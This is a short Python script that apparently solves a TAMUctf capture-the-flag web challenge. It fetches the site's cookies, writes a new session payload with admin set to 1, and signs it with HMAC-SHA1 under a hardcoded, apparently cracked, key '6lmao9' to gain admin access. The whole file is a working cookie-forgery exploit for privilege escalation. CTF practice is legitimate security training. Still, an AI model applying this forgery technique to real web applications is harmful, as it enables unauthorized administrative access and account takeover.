from Crypto.Util.strxor import strxor
from requests import Session
from base64 import b64decode, b64encode
import hmac

s = Session()
base_url = "https://cracked.tamuctf.com/"
key = "6lmao9"
r = s.get(base_url)
ses_cookie = r.cookies.get("session")
ses_cookie = b64decode(ses_cookie)
sig_cookie = r.cookies.get("sig")
sig_cookie = b64decode(sig_cookie)

default_cookie = b'{"admin": 0, "username": "guest"}'
target_cookie = b'{"admin": 1, "username": "guest"}'

ses_cookie = b64encode(target_cookie).decode()
sig_cookie = hmac.new(key.encode(), target_cookie, "sha1").digest()
sig_cookie = b64encode(sig_cookie).decode()

s.cookies.set("session", ses_cookie)
s.cookies.set("sig", sig_cookie)
r = s.get(base_url)
print(r.text)